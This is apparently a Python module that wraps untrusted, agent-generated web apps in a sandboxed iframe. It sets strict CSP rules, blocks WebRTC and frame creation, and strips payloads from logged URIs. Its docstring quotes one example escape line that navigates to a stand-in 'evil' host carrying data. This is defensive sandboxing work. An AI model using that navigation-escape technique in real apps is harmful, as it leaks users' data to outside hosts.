"""The sandbox wrapper document for server-rendered app hosts.

The dashboard renders MiniApps in a sandboxed iframe directly. A server-rendered
host (the public publication page) needs the same protection, so the wrapper
document lives here in Python as well.

Why a wrapper at all: the app HTML is agent-generated and therefore untrusted.
CSP does not cover navigation, so an app can call
``location.href = "https://evil/?d=..."`` (or use ``<meta http-equiv="refresh">``)
and leave its frame. The sandbox flags survive that navigation and the origin
stays opaque, so a host checking ``event.source === iframe.contentWindow`` still
accepts the escaping page, which then inherits the bridge and can read every
row through the host.

Embedding the app one level deeper fixes it. A child frame's own navigation is
checked against its *embedder's* ``frame-src``, and the wrapper declares
``frame-src 'none'``, so the browser refuses the escape. The wrapper also
relays messages in both directions, because the host cannot reach into an
opaque-origin frame.

The second ``load`` event on the app frame is the tripwire: the first load is
the srcdoc itself, any later load means the frame navigated away.
"""

from __future__ import annotations

import json
import re
from urllib.parse import urlsplit

APP_CSP = (
    "default-src 'none'; script-src 'unsafe-inline'; "
    "style-src 'unsafe-inline'; img-src data: blob:; "
    "font-src data:; media-src data: blob:; connect-src 'none'; "
    "base-uri 'none'; form-action 'none'; object-src 'none'"
)
"""CSP for the app document itself.

Do not add an explicit ``frame-src 'none'`` here: Chrome refuses to create the
app's own srcdoc frame when the app document declares it, leaving a blank page.
``default-src 'none'`` still implies no nested frames; the wrapper carries the
explicit navigation ban.
"""

WRAPPER_CSP = APP_CSP + "; frame-src 'none'"
"""CSP for the wrapper document that hosts the app frame.

A srcdoc child inherits its embedder's policy, so the wrapper must allow
everything the app itself needs (data: images, fonts, media) in addition to
denying navigation.
"""

WEBRTC_FREEZE = r"""(function () {
  var RTC = ["RTCPeerConnection", "webkitRTCPeerConnection", "mozRTCPeerConnection", "RTCDataChannel"];
  var EMBED = { IFRAME: 1, FRAME: 1, OBJECT: 1, EMBED: 1, PORTAL: 1 };
  var FRAME_MARKUP = /<\s*(iframe|frame|object|embed|portal)\b/i;

  function block(target, name) {
    try {
      Object.defineProperty(target, name, {
        value: undefined, configurable: false, writable: false
      });
    } catch (e) {}
  }
  function blockGlobal(name) {
    block(window, name);
    try {
      var proto = Object.getPrototypeOf(window);
      if (proto) block(proto, name);
    } catch (e) {}
  }
  for (var i = 0; i < RTC.length; i++) blockGlobal(RTC[i]);
  var constructors = [
    "HTMLIFrameElement", "HTMLFrameElement", "HTMLObjectElement", "HTMLEmbedElement",
    "Worker", "SharedWorker", "WebTransport", "open"
  ];
  for (var j = 0; j < constructors.length; j++) blockGlobal(constructors[j]);
  try {
    if (typeof Navigator !== "undefined") {
      block(Navigator.prototype, "serviceWorker");
      block(navigator, "serviceWorker");
    }
  } catch (e) {}

  function isEmbed(tag) {
    return Object.prototype.hasOwnProperty.call(EMBED, String(tag).toUpperCase());
  }
  function reject() {
    throw new Error("Frames are not available in a MiniApp");
  }
  function hasFrameMarkup(value) {
    return FRAME_MARKUP.test(String(value));
  }
  function containsEmbed(node) {
    if (!node || typeof node !== "object") return false;
    if (node.nodeType === 1 || node.nodeType === 11) {
      if (node.nodeType === 1 && isEmbed(node.tagName)) return true;
      if (node.querySelector && node.querySelector("iframe,frame,object,embed,portal")) {
        return true;
      }
    }
    return false;
  }
  function guardMethod(proto, name) {
    var original = proto[name];
    if (typeof original !== "function") return;
    Object.defineProperty(proto, name, {
      configurable: true,
      writable: true,
      value: function () {
        for (var i = 0; i < arguments.length; i++) {
          if (hasFrameMarkup(arguments[i]) || containsEmbed(arguments[i])) reject();
        }
        return original.apply(this, arguments);
      }
    });
  }
  function guardSetter(proto, name) {
    var desc = Object.getOwnPropertyDescriptor(proto, name);
    if (!desc || !desc.set) return;
    var original = desc.set;
    Object.defineProperty(proto, name, {
      configurable: true,
      get: desc.get,
      set: function (value) {
        if (hasFrameMarkup(value)) reject();
        return original.call(this, value);
      }
    });
  }

  var createElement = Document.prototype.createElement;
  Document.prototype.createElement = function (tag, options) {
    if (isEmbed(tag)) reject();
    return createElement.call(this, tag, options);
  };
  var createElementNS = Document.prototype.createElementNS;
  Document.prototype.createElementNS = function (ns, tag, options) {
    if (isEmbed(tag)) reject();
    return createElementNS.call(this, ns, tag, options);
  };

  guardSetter(Element.prototype, "innerHTML");
  guardSetter(Element.prototype, "outerHTML");
  if (typeof ShadowRoot !== "undefined") guardSetter(ShadowRoot.prototype, "innerHTML");
  guardMethod(Element.prototype, "insertAdjacentHTML");
  guardMethod(Element.prototype, "append");
  guardMethod(Element.prototype, "prepend");
  guardMethod(Element.prototype, "replaceChildren");
  guardMethod(Element.prototype, "insertAdjacentElement");
  guardMethod(Element.prototype, "setHTMLUnsafe");
  guardMethod(Element.prototype, "setHTML");
  if (typeof ShadowRoot !== "undefined") {
    guardMethod(ShadowRoot.prototype, "setHTMLUnsafe");
    guardMethod(ShadowRoot.prototype, "setHTML");
  }
  guardMethod(Document.prototype, "write");
  guardMethod(Document.prototype, "writeln");
  guardMethod(Document.prototype, "execCommand");
  guardMethod(Document.prototype, "parseHTMLUnsafe");
  guardMethod(Document, "parseHTMLUnsafe");
  if (typeof DOMParser !== "undefined") guardMethod(DOMParser.prototype, "parseFromString");
  if (typeof Range !== "undefined") guardMethod(Range.prototype, "createContextualFragment");

  function removeEmbeds(root) {
    if (!root || root.nodeType !== 1) return;
    if (isEmbed(root.tagName)) {
      try { root.remove(); } catch (e) {}
      return;
    }
    if (root.querySelectorAll) {
      var nodes = root.querySelectorAll("iframe,frame,object,embed,portal");
      for (var k = nodes.length - 1; k >= 0; k--) {
        try { nodes[k].remove(); } catch (e) {}
      }
    }
  }
  try {
    var observer = new MutationObserver(function (records) {
      for (var i = 0; i < records.length; i++) {
        var added = records[i].addedNodes;
        for (var j = 0; j < added.length; j++) removeEmbeds(added[j]);
      }
    });
    observer.observe(document, { childList: true, subtree: true });
  } catch (e) {}
  document.addEventListener("DOMContentLoaded", function () {
    removeEmbeds(document.documentElement);
  });
})();"""
"""Runs before app scripts: disables WebRTC and frame creation.

The dashboard builds the same document in TypeScript; keep the two in sync.
"""


_EMBED_RE = re.compile(r"<\s*(iframe|frame|object|embed|portal)\b", re.IGNORECASE)


def has_embedded_frame(html: str) -> bool:
    """Whether the app document embeds a frame/plugin element statically."""
    return bool(_EMBED_RE.search(html))


def build_app_doc(html: str, head_html: str) -> str:
    """Build the app document with the freeze script before every app script.

    The first ``<html ...>`` tag is rewritten so its attributes survive while
    the freeze script becomes the first executable content, even when the app
    puts a script before ``<head>``.
    """
    if has_embedded_frame(html):
        # Old apps may predate the write-time rule; never run one whose static
        # HTML would create a fresh realm before the freeze can protect it.
        return (
            '<!doctype html><html><head><meta http-equiv="Content-Security-Policy" '
            "content=\"default-src 'none'; style-src 'unsafe-inline'\"></head>"
            "<body><p>This MiniApp embeds a frame and cannot be displayed.</p></body></html>"
        )
    html_match = re.search(r"<html\b([^>]*)>", html, re.IGNORECASE)
    html_attrs = html_match.group(1) if html_match else ""
    body = html
    if html_match:
        body = html[: html_match.start()] + html[html_match.end() :]
    body = re.sub(r"^\s*<!doctype[^>]*>", "", body, flags=re.IGNORECASE)
    head_match = re.search(r"<head[^>]*>", body, re.IGNORECASE)
    if head_match:
        at = head_match.end()
        body = f"{body[:at]}{head_html}{body[at:]}"
    else:
        body_match = re.search(r"<body[^>]*>", body, re.IGNORECASE)
        if body_match:
            body = (
                f"{body[: body_match.start()]}<head>{head_html}</head>{body[body_match.start() :]}"
            )
        else:
            body = f"<head>{head_html}</head><body>{body}</body>"
    return f"<!doctype html><html{html_attrs}><script>{WEBRTC_FREEZE}</script>{body}"


_WRAPPER_SCRIPT = """
(function () {
  var APP_HTML = __APP_HTML__;
  var inner = document.createElement("iframe");
  var loads = 0;
  var dropped = false;

  inner.setAttribute("sandbox", "allow-scripts");
  inner.setAttribute("title", "app");
  inner.addEventListener("load", function () {
    loads += 1;
    if (loads > 1) {
      dropped = true;
      try { inner.remove(); } catch (e) {}
      parent.postMessage({ source: "octop-app-host", type: "escaped" }, "*");
      return;
    }
    parent.postMessage({ source: "octop-app-host", type: "ready" }, "*");
  });

  window.addEventListener("message", function (event) {
    if (!inner || dropped) return;
    if (event.source === inner.contentWindow) {
      parent.postMessage(event.data, "*");
      return;
    }
    if (event.source === parent) {
      inner.contentWindow.postMessage(event.data, "*");
    }
  });

  inner.srcdoc = APP_HTML;
  document.body.appendChild(inner);
})();
"""


def build_wrapper_doc(app_html: str) -> str:
    """Return the wrapper document that embeds *app_html* in a sandboxed frame.

    ``app_html`` is embedded as a JSON string and ``</`` is neutralised, so a
    script tag inside the app cannot close the wrapper's own script block.
    """
    payload = json.dumps(app_html).replace("</", "<\\/")
    script = _WRAPPER_SCRIPT.replace("__APP_HTML__", payload)
    return f"""<!doctype html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="{WRAPPER_CSP}">
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  html, body {{ margin: 0; padding: 0; height: 100%; background: #fff; }}
  iframe {{ position: fixed; inset: 0; width: 100%; height: 100%; border: 0; display: block; }}
</style>
</head>
<body>
<script>{script}</script>
</body>
</html>"""


def sanitize_blocked_uri(raw: str) -> str:
    """Keep a CSP-blocked URI useful for triage, without its query/fragment.

    A blocked URL may carry the very data the page was trying to exfiltrate.
    The audit log keeps the origin and path so an operator can see what the
    page attempted, but not the payload.
    """
    text = raw.strip()
    if not text:
        return ""
    lowered = text.lower()
    if lowered.startswith(("http://", "https://")):
        try:
            parts = urlsplit(text)
        except ValueError:
            return text[:80]
        host = parts.hostname or ""
        path = parts.path[:120]
        return f"{parts.scheme}://{host}{path}"[:200]
    # Any other scheme (data:, blob:, about:, javascript:, …) keeps only its
    # name: the rest can carry the payload the page tried to send.
    scheme, sep, _rest = lowered.partition(":")
    if sep and scheme.isalpha() and len(scheme) <= 20:
        return scheme + ":"
    return text[:80]


__all__ = [
    "APP_CSP",
    "WEBRTC_FREEZE",
    "WRAPPER_CSP",
    "build_app_doc",
    "build_wrapper_doc",
    "has_embedded_frame",
    "sanitize_blocked_uri",
]
